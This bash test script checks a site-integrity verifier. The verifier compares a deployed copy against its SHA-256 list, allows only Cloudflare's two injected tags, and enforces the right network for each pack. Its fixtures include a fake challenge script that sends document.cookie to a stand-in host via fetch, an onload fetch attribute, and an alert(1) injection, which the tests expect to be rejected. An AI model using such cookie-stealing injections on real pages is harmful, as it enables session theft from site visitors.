#!/usr/bin/env bash
# scripts/verify-live.py against a copy of the site on disk, with no network: a pack of this checkout's HEAD
# and the list scripts/pack-site.sh writes beside it. Cloudflare's two tags in index.html are cut, in either
# order, and the copy passes with exit 0; a file that differs or is missing, anything else on the page, or a
# tag that only looks like Cloudflare's, fails it with exit 1 and names the file; a list it cannot use stops
# it with exit 2. A pack made for the other network than the site it is checked as fails it too, before a file
# is compared: every file of it would match its own list.
set -euo pipefail
cd "$(dirname "$0")/.."
TMP="$(mktemp -d -t verifylive.XXXXXX)"; trap 'rm -rf "$TMP"' EXIT
./scripts/pack-site.sh HEAD "$TMP/pack" >/dev/null
LIST="$TMP/pack.sha256"
n="$(wc -l < "$LIST" | tr -d ' ')"

# The two tags as Cloudflare served them before </body> on 8 November 2026, word for word, with the ray id,
# the time, the version and the tokens replaced by zeros of the same length.
A86="$(printf 'A%.0s' {1..86})"
Z45="$(printf '0%.0s' {1..45})"
BEACON="<script type=\"module\" src=\"https://static.cloudflareinsights.com/beacon.min.js/v$Z45\" integrity=\"sha512-$A86==\""
BEACON+=" data-cf-beacon='{\"version\":\"2024.11.0\",\"token\":\"00000000000000000000000000000000\",\"r\":1,\"spa\":2}'"
BEACON+=" crossorigin=\"anonymous\"></script>"
CHALLENGE=$(cat <<'EOF'
<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'0000000000000000',t:'MDAwMDAwMDAwMA=='};var l=window.parent.location,o;try{o=new URL(l.origin).origin}catch(e){try{o=new URL(new URL(l.href).origin).origin}catch(e){o=''}}var u='/cdn-cgi/challenge-platform/scripts/jsd/main.js?ray=0000000000000000',a=document.createElement('script');a.src=o?new URL(u,o).href:u;document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
EOF
)
# The same two, each with something of its own: a script that starts like the challenge and names its path but
# runs a body of its own, and the beacon with one attribute more.
DRESSED="<script>(function(){function c(){fetch('//x.example/'+document.cookie)}"
DRESSED+="/* /cdn-cgi/challenge-platform/scripts/jsd/main.js */})();</script>"
ONLOAD="${BEACON/ crossorigin=/ onload=\"fetch('//x.example')\" crossorigin=}"

site() { rm -rf "$TMP/site"; cp -R "$TMP/pack" "$TMP/site"; }
# insert <text>...: puts the texts, in order, right before </body> of the copy's index.html, byte for byte.
insert() {
  python3 -I - "$TMP/site/index.html" "$@" <<'PY'
import sys
path, parts = sys.argv[1], [p.encode() for p in sys.argv[2:]]
html = open(path, "rb").read()
at = html.rindex(b"</body>")
open(path, "wb").write(html[:at] + b"".join(parts) + html[at:])
PY
}
# check <what> <exit wanted> <a line the output must hold> [list] [flags before the list...]
check() {
  local out code=0
  out="$(python3 scripts/verify-live.py "${@:5}" "${4:-$LIST}" "$TMP/site" 2>&1)" || code=$?
  [ "$code" = "$2" ] || { echo "FAIL $1: exit $code, wanted $2"; printf '%s\n' "$out"; exit 1; }
  grep -qF -- "$3" <<<"$out" || { echo "FAIL $1: no line holding: $3"; printf '%s\n' "$out"; exit 1; }
  echo "ok   $1"
}

site
check "the pack itself passes" 0 "match=$n differ=0 of $n"
awk '{ printf "%s\r\n", $0 }' "$LIST" > "$TMP/crlf.sha256"
check "a list with CRLF line ends passes too" 0 "match=$n differ=0 of $n" "$TMP/crlf.sha256"
site; insert "$BEACON"$'\n' "$CHALLENGE"
check "Cloudflare's beacon, then its challenge script, are cut" 0 "challenge script x1 and Web Analytics beacon x1"
site; insert "$CHALLENGE" "$BEACON"$'\n'
check "the challenge script, then the beacon, are cut" 0 "match=$n differ=0 of $n"
site; insert "$BEACON"$'\n' "$DRESSED"
check "a script dressed as the challenge, with a body of its own, fails it" 1 "DIFF index.html"
site; insert "$ONLOAD"$'\n' "$CHALLENGE"
check "the beacon with an onload attribute fails it" 1 "DIFF index.html"
site; insert "$BEACON"$'\n' "$CHALLENGE" "<script>alert(1)</script>"
check "anything else on the page fails it" 1 "DIFF index.html"
site; printf '/* one more line */\n' >> "$TMP/site/style.css"
check "a file that differs fails it, by name" 1 "DIFF style.css"
site; rm "$TMP/site/views/pool.js"
check "a file that is missing fails it, by name" 1 "ERR  views/pool.js"
site; : > "$TMP/empty.sha256"
check "an empty list stops it" 2 "names no file" "$TMP/empty.sha256"
printf 'not a sha256 line\n' > "$TMP/odd.sha256"
check "a line that is not a sha256 line stops it" 2 "is not a sha256 line" "$TMP/odd.sha256"
sed -n '1s|  \./.*|  ./../outside.txt|p' "$LIST" > "$TMP/outside.sha256"
check "a file outside the pack stops it" 2 "is not a sha256 line" "$TMP/outside.sha256"
# The network. The pack is testnet's and says so; the same files with a build.json that names mainnet are a mainnet
# pack, with its own list: uploaded where the testnet site is, every file of it matches that list.
grep -q '"network":"testnet"' "$TMP/pack/build.json" || { echo "FAIL a testnet pack names testnet in build.json"; exit 1; }
SUM=(sha256sum); command -v sha256sum >/dev/null 2>&1 || SUM=(shasum -a 256)
# as <network>: the copy becomes a pack for that network (or, with "none", one whose build.json names none), and
# its list is written to $TMP/as.sha256.
as() {
  site
  python3 -I - "$TMP/site/build.json" "$1" <<'PY'
import json, sys
path, network = sys.argv[1], sys.argv[2]
build = json.load(open(path))
build.pop("network", None)
if network != "none":
    build["network"] = network
open(path, "w").write(json.dumps(build, separators=(",", ":")) + "\n")
PY
  (cd "$TMP/site" && find . -type f -print0 | LC_ALL=C sort -z | xargs -0 "${SUM[@]}") > "$TMP/as.sha256"
}
as mainnet
check "a mainnet pack is refused as the testnet site, though every file matches its list" 1 "serves a pack made for mainnet, and this is the check of the testnet site; nothing was compared" "$TMP/as.sha256"
check "a mainnet pack passes as the mainnet site" 0 "match=$n differ=0 of $n" "$TMP/as.sha256" --network mainnet
site
check "the testnet pack passes when testnet is named" 0 "match=$n differ=0 of $n" "$LIST" --network testnet
check "a testnet pack is refused as the mainnet site" 1 "serves a pack made for testnet, and this is the check of the mainnet site; nothing was compared" "$LIST" --network mainnet
as none
check "a pack from before the packer named a network passes as testnet's" 0 "match=$n differ=0 of $n" "$TMP/as.sha256"
check "a pack from before the packer named a network is refused as the mainnet site" 1 "serves a pack made for testnet" "$TMP/as.sha256" --network mainnet
as devnet
check "a pack for a network that is neither is refused" 1 "serves a pack made for devnet" "$TMP/as.sha256"
site; rm "$TMP/site/build.json"
check "a site with no build.json does not say what it is" 1 "does not say which network its pack is for"
site; printf 'not json\n' > "$TMP/site/build.json"
check "a build.json that cannot be read does not say what it is" 1 "does not say which network its pack is for"
site
check "a network there is none of stops it" 2 "verify-live.py [--network testnet|mainnet]" "$LIST" --network devnet
check "a network flag with no network stops it" 2 "verify-live.py [--network testnet|mainnet]" "$TMP/site" --network
echo "test-verify-live: the check cuts only Cloudflare's two tags, fails on anything else, and holds the pack's network to the site's"
